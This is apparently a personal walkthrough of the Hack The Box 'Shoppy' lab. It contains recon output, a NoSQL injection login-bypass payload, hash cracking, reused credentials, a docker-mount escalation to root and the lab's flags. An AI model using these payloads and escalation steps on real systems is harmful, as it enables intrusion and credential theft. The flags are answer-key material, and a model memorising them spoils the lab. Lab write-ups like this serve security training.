# Shoppy

Flags:
user: 479e943b6c2c66d0bdafe4fa9a385acd
root: ad7834a1f1d5d52cfbbc9689b2ceac42

## Intel found
OS: Debian 5+deb11u1
SSH: OpenSSH 8.4p1
    CVE-2021-28041
Nginx: 1.23.1

## Nmap
TCP:
```
$ nmap -A 10.10.11.180                                                                                     tom@tom
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 14:47 CEST
Nmap scan report for 10.10.11.180
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds
```

UDP:
```
$ sudo nmap -sU -sA 10.10.11.180                                                                       1 ↵ tom@tom
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 14:48 CEST
Nmap scan report for 10.10.11.180
Host is up (0.012s latency).
Not shown: 1000 unfiltered tcp ports (reset), 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 1008.60 seconds
```

## Dir discovery
```
$ gobuster dir -k -w /opt/wordlists/big.txt -u http://shoppy.htb                                           tom@tom
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/05 16:21:34 Starting gobuster in directory enumeration mode
===============================================================
/Admin                (Status: 302) [Size: 28] [--> /login]
/Login                (Status: 200) [Size: 1074]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/images               (Status: 301) [Size: 179] [--> /images/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/login                (Status: 200) [Size: 1074]

===============================================================
2022/10/05 16:21:47 Finished
===============================================================
```

## Gobuster subdomains
```
$ gobuster vhost -w /opt/wordlists/subdomains.txt -u http://shoppy.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shoppy.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /opt/wordlists/subdomains.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/10/06 11:22:53 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
```

## SQL bypass
Mongo NOSQL
username: `admin' || '1=1`
password: `admin' || '1=1`

## Inside login
Get all users with `admin' || '1=1`

```
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]
```

## Cracking passwords
hashcat
```
$ hashcat -a 0 -m 0 hashes.txt /opt/wordlists/rockyou.txt
...
6ebcea65320589ca4f2f1ce039975995:remembermethisway
...
```

## Mattermost login
Users:
jess
jaeger

Passwords
jaeger Sh0ppyBest@pp!

Uses Docker

Password manager on Docker

## SSH login
jaeger Sh0ppyBest@pp!

## User.txt
479e943b6c2c66d0bdafe4fa9a385acd

## Password-manager
Password: Sample

## System enummeration
```
jaeger $ uname -a
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 GNU/Linux
```

```
jaeger $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
jaeger:x:1000:1000:jaeger,,,:/home/jaeger:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
nginx:x:117:125:nginx user,,,:/nonexistent:/bin/false
mongodb:x:118:65534::/home/mongodb:/usr/sbin/nologin
deploy:x:1001:1001::/home/deploy:/bin/sh
postgres:x:119:127:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mattermost:x:998:997::/home/mattermost:/bin/sh
```

```
jaeger $ sudo -l
[sudo] password for jaeger:
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

```
jaeger $ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

```
deploy $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
root
```

```
root $ cat /root/root.txt
ad7834a1f1d5d52cfbbc9689b2ceac42
```
